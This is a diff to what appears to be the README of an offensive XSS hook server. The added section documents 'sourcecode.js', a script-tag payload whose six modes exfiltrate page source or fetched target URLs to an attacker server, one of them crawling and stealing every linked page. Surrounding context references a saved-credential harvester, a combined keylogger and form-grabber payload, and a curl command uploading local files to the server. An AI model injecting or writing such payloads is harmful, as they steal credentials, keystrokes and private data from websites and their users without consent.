@@ -138,6 +138,50 @@ Attempts to capture browser-saved credentials using invisible form fields.
 <script src="http://your-server:8080/hooks/savedcreds.js"></script>
 ```
 
+#### **sourcecode.js** - Source Code Exfiltration
+Powerful payload for exfiltrating page source code with multiple modes:
+
+**Mode 1: Exfiltrate current page to /data endpoint**
+```html
+<script src="http://your-server:8080/hooks/sourcecode.js?d=self"></script>
+```
+
+**Mode 2: Fetch external URL and send to /data endpoint**
+```html
+<script src="http://your-server:8080/hooks/sourcecode.js?d=https://target.com/api/config"></script>
+```
+
+**Mode 3: Exfiltrate current page to /upload (auto filename)**
+```html
+<script src="http://your-server:8080/hooks/sourcecode.js?u=self"></script>
+```
+
+**Mode 4: Exfiltrate current page to /upload (custom filename)**
+```html
+<script src="http://your-server:8080/hooks/sourcecode.js?u=self&n=mypage.html"></script>
+```
+
+**Mode 5: Fetch external URL and upload with custom filename**
+```html
+<script src="http://your-server:8080/hooks/sourcecode.js?u=https://target.com/data&n=data.json"></script>
+```
+
+**Mode 6: Crawl and exfiltrate current page + ALL linked pages** 🔥
+```html
+<script src="http://your-server:8080/hooks/sourcecode.js?u=all"></script>
+```
+
+Features:
+- **d=self**: Exfiltrate current page to /data as JSON
+- **d=url**: Fetch external URL and send to /data as JSON
+- **u=self**: Upload current page (auto-generates filename from URL)
+- **u=url**: Fetch external URL and upload (auto-generates filename)
+- **u=all**: Recursively exfiltrate current page + all linked pages
+- **n=filename**: Custom filename (works with u parameter)
+- **2-second delay**: Waits for page rendering before exfiltration
+- **Smart filenames**: Extracts from URL or generates unique names
+- **Duplicate prevention**: Auto-appends counter for duplicate filenames
+
 #### **combo.js** - Combined Payload
 All-in-one payload that includes info exfiltration, keylogger, and form grabber.
 
@@ -152,6 +196,19 @@ File upload endpoint that saves uploaded files to the current working directory.
 ```bash
 curl -X POST http://your-server:8080/upload/exfiltrated.txt \
   --data-binary @localfile.txt
+```
+
+### `/api/<command>`
+API endpoint for controlling the web server.
+
+**Available Commands:**
+
+#### `/api/clear`
+Clears the server console window (works on both Windows and Unix systems).
+
+**Usage:**
+```bash
+curl http://your-server:8080/api/clear
 ```
 
 ### `/<path>`
